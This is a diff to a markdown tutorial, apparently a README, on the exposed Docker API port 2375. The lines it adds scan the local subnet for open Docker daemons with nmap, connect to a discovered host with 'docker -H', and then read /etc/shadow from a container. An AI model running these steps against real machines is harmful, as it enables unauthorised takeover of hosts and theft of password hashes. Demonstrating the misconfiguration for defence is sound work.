@@ -73,23 +73,38 @@ Also for application that manages containers, the use of this port is needed.
 > single hosts. Nmap runs on all major computer operating systems, and 
 > official binary packages are available for Linux, Windows, and Mac OS X. 
 
+> **For Windows users**
+> 
+> you can use wsl for the nmap part
+
 install nmap
 ```bash
 sudo apt update
 sudo apt install nmap
 ```
 
-launch this command
+launch this command to see that your docker 2375 port is open
 ```bash
 nmap -p2375 localhost -nvvvv
 ```
 you should see at the end of the logs
 >        PORT     STATE SERVICE REASON
 >       2375/tcp open  docker  syn-ack
-        
+
+find your default gateway
+```bash
+ip route show | grep default | awk '{ print $4 }'     
+```
+
+scan all the ips on your current sub domain
+```bash
+subDomain=$(ip route show | grep default| awk '{ print $4 }'| awk  -F  "." '{ print $1"."$2"."$3 }' | head -1)
+nmap --open -p 2375 ${subDomain}.1-254 -oG - 2>/dev/null | grep "/open" | awk '{ print $2 }'
+```
+
 You can see docker ps output by running
 ```bash
-docker -H tcp://127.0.0.1:2375 ps
+docker -H tcp://<place here one of the ip listed in the previous command>:2375 ps
 ```
    
 now launch a container using this port
@@ -102,3 +117,5 @@ see if we have access to /etc/shadow
 cat /etc/shadow
 ```
 exit to leave bash session
+
+## TODO gosu
